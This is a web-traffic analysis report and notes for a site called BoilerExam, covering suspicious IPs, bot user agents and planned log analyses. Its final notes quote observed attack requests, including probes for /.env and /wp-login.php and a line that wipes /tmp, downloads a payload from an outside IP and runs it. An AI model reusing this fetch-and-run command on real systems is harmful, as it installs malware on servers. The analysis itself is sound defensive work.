### BoilerExam Data Analysis Report

#### 1. **Suspicious Requests from a Specific IP**  
The IP address `52.169.249.118` was observed repeatedly attempting to access `wp-content` and other WordPress-related PHP files.  

For further details, refer to `results/malicious_ip.ipynb`.

#### 2. **Unusual User Agent: `axios/1.6.7`**  
Unlike typical user agent values such as Mac or Windows identifiers, `axios/1.6.7` exhibited unusual behavior:  
  - Consistent 5-second interval requests targeting the stats page.  

For additional insights, review `results/weird_user_agent.ipynb`.

#### 3. **Miscellaneous Data Analysis**  
Some aspects of the data analysis require a deeper review but were not fully explored due to time constraints.

For more details, refer to `results/misc.ipynb`

---

### More Ideas from my note
    
**1. Geolocation Analysis**
  - **Goal**: Determine the geographic origin of requests based on `client_ip`.
  -  **Steps**:
        1. Use an IP geolocation service (e.g., MaxMind, IP2Location) to map IPs to locations (country, city, region).
        2. Visualize user distribution with a world map or a heatmap.
        3. Identify if certain regions generate disproportionate amounts of traffic, which might indicate:
            - Legitimate user clusters.
            - Malicious activity clusters (e.g., botnets).

**~~2. User-Agent Analysis~~** [Completed]
  - **Goal**: Analyze patterns in user behavior or detect bots.
  - **Steps**:
    1. Parse the `user_agent` field to identify:
        - Browsers (e.g., Chrome, Firefox).
        - Operating systems (e.g., Windows, macOS, Linux).
        - Suspicious user agents (e.g., scripts or bots).
    2. Look for anomalies like:
        - High traffic from outdated browsers.
        - Generic or malformed user-agent strings.

**3. HTTP Status Code Analysis**
  - **Goal**: Evaluate server responses and identify issues.
  - **Steps**:
    1. Aggregate counts of `http_status` codes.
      - **200**: Successful requests.
      - **301/302**: Redirects.
      - **403/401**: Unauthorized or forbidden.
      - **404**: Not Found.
      - **500/502**: Server errors.
    2. Investigate spikes or patterns in error codes (e.g., a sudden increase in 404s may indicate a scanning attempt).
    
**4. Request Path Analysis**
  - **Goal**: Identify popular or unusual endpoints.
  - **Steps**:
    1. Analyze the most frequently accessed endpoints in the `request` column.
    2. Detect anomalies such as:
        - Repeated access to non-existent or sensitive files.
        - High traffic to specific endpoints (e.g., `/login`, `/admin`).
    3. Categorize requests into legitimate use cases (e.g., API calls, asset requests) and suspicious activity.
    
**5. Traffic Pattern Analysis**  
  - **Goal**: Identify time-based trends or anomalies.
  - **Steps**:
    1. Group requests by time intervals (e.g., hour, minute).
    2. Plot traffic patterns over time to identify:
        - Peak usage times.
        - Unexpected bursts of activity (potential DDoS attacks or bots).
    3. Compare weekdays vs. weekends or daily patterns to understand user behavior.

**~~6. Anomaly Detection~~** [Completed]
  - **Goal**: Detect unusual activity across various dimensions.
  - **Steps**:
      1. Define thresholds for "normal" behavior (e.g., requests per minute per IP).
      2. Identify outliers in:
          - Traffic volume.
          - HTTP status patterns.
          - Repeated access to specific endpoints.
      3. Highlight IPs or requests that deviate significantly from the norm.

**7. IP Reputation Check**    
  - **Goal**: Identify malicious or suspicious IPs.
  - **Steps**:
      1. Cross-check `client_ip` with known blacklists (e.g., AbuseIPDB, Spamhaus).
      2. Flag IPs with a history of malicious activity or high abuse scores.
      3. Monitor flagged IPs for recurring patterns.
    
**8. Correlate Traffic with Referrer**    
  - **Goal**: Understand how users are navigating to the site.
  - **Steps**:
    1. Analyze the `referer` column to identify:
        - Sources of traffic (e.g., search engines, direct access).
        - Suspicious or unexpected referrers (e.g., spam domains).
    2. Detect if certain referrers are driving malicious traffic.
    
**9. Resource Load Analysis**  
  - **Goal**: Measure server resource usage.
  - **Steps**:
    1. Use `request_body_bytes` to analyze the size of incoming requests.
    2. Look for:
        - Large payloads that may indicate abuse or file upload attempts.
        - Small, frequent payloads that could be characteristic of bot activity.

**10. User Behavior Analysis**
  - **Goal**: Track individual or grouped user activity patterns.
  - **Steps**:
    1. Group requests by `client_ip` to study user behavior over time.
    2. Look for:
        - Repeated requests to the same endpoints.
        - Users accessing sensitive endpoints (e.g., `/admin`, `/login`) without valid credentials.

**~~11. Bot Detection~~** [Completed]
  - **Goal**: Separate bots from legitimate users.
  - **Steps**:
    1. Identify patterns typical of bots, such as:
        - High-frequency requests.
        - Missing or generic user-agent strings.
        - Accessing non-existent or sensitive files.
    2. Develop heuristics or use machine learning to flag bot-like behavior.
    
**12. Dashboard Creation**    
  - **Goal**: Build a dashboard for real-time monitoring.
  - **Steps**:
    1. Use tools like Grafana or Kibana to visualize trends in the data.
    2. Include metrics like:
        - Active IPs.
        - Traffic by country.
        - HTTP status distribution.
        - Most accessed endpoints.

**13. Play around with the data**
  - SELECT * FROM data WHERE http_status NOT IN (200, 304, 204);
  - Only check 301
  - http status: 401 UNAUTHORIZED, 499
  - GET /robots.txt HTTP/1.1
  - GET /wp-login.php HTTP/1.1
  - GET /ads.txt HTTP/1.1
  - GET /.env HTTP/1.1
  - ~~Censysinspect~~
  - ~~PRI * HTTP/2.0, 400~~
      - 167.94.138.41
  - OPTIONS /submissions HTTP/2.0
  - GET /shell?cd+/tmp;rm+-rf+*;wget+ 132.145.21.30/jaws;sh+/tmp/jaws HTTP/1.1302154 Hello, world
